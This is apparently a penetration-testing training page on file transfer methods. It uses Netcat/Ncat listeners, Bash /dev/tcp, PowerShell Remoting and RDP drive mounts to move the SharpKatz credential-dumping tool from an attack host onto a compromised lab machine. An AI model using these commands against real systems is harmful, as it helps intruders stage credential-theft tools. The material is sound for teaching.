## File Transfer with Netcat and Ncat

The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.

In this example, we'll transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.

We'll first start Netcat (`nc`) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\)) using a single greater-than `>` followed by the filename, `SharpKatz.exe`.

#### NetCat - Compromised Machine - Listening on Port 8000

Miscellaneous File Transfer Methods

```bash
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.

#### Ncat - Compromised Machine - Listening on Port 8000

Miscellaneous File Transfer Methods

```bash
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

#### Netcat - Attack Host - Sending File to Compromised machine

Miscellaneous File Transfer Methods

```bash
OathBornX@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
OathBornX@htb[/htb]$ # Example using Original Netcat
OathBornX@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.

#### Ncat - Attack Host - Sending File to Compromised machine

Miscellaneous File Transfer Methods

```bash
OathBornX@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
OathBornX@htb[/htb]$ # Example using Ncat
OathBornX@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Instead of listening on our `compromised machine`, `we can connect to a port on our attack host` to perform the `file transfer operation`. This method is `useful in scenarios where there's a firewall blocking inbound connections`. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.

#### Attack Host - Sending File as Input to Netcat

Miscellaneous File Transfer Methods

```bash
OathBornX@htb[/htb]$ # Example using Original Netcat
OathBornX@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Compromised Machine Connect to Netcat to Receive the File

Miscellaneous File Transfer Methods

```bash
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Let's do the same with Ncat:

#### Attack Host - Sending File as Input to Ncat

Miscellaneous File Transfer Methods

```bash
OathBornX@htb[/htb]$ # Example using Ncat
OathBornX@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connect to Ncat to Receive the File

Miscellaneous File Transfer Methods

```bash
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

If we don't have `Netcat or Ncat` on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Writing to this particular file makes Bash open a `TCP connection` to `host:port`, and this feature may be used for `file transfers.`

#### NetCat - Sending File as Input to Netcat

Miscellaneous File Transfer Methods

```bash
OathBornX@htb[/htb]$ # Example using Original Netcat
OathBornX@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - Sending File as Input to Ncat

Miscellaneous File Transfer Methods

```bash
OathBornX@htb[/htb]$ # Example using Ncat
OathBornX@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

Miscellaneous File Transfer Methods

```bash
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

---

# PowerShell Session File Transfer

When `PowerShell`, `HTTP`, `HTTPS`, or `SMB` aren’t options, use `PowerShell` `Remoting` (`WinRM`) for file transfers.

`PowerShell` `Remoting` lets you run commands or scripts on remote systems through `PowerShell` sessions. It’s built for admin control across a network, and it works for moving files too. Turning it on creates listeners on `TCP/5985` (`HTTP`) and `TCP/5986` (`HTTPS`).

To start a `PowerShell` `Remoting` session, you need admin rights, to be in the `Remote Management Users` group, or have explicit remoting permissions set.

Example: you’re logged in as `Administrator` on `DC01`. You also have admin rights on `DATABASE01` and `PowerShell` `Remoting` is already enabled on the target. First step is verifying `WinRM` connectivity with `Test-NetConnection`.

#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

```powershell
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```powershell
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.
#### Create a PowerShell Remoting Session to DATABASE01

```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.
#### Copy samplefile.txt from our Localhost to the DATABASE01 Session

```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### Copy DATABASE.txt from DATABASE01 Session to our Localhost

```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

---

# RDP

`RDP` (Remote Desktop Protocol) is the usual Windows remote-access tool — you can transfer files by copy-and-paste: copy from the remote desktop and paste into your local session (or vice versa).  
From Linux use `xfreerdp` or `rdesktop`; both support clipboard file transfers but behavior can be flaky depending on server settings.  
If clipboard fails, expose a local folder to the remote session: both `xfreerdp` and `rdesktop` can mount a local directory into the RDP session so you can move files without relying on copy/paste.

#### Mounting a Linux Folder Using rdesktop

Miscellaneous File Transfer Methods

```shell
OathBornX@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Mounting a Linux Folder Using xfreerdp

Miscellaneous File Transfer Methods

```shell
OathBornX@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

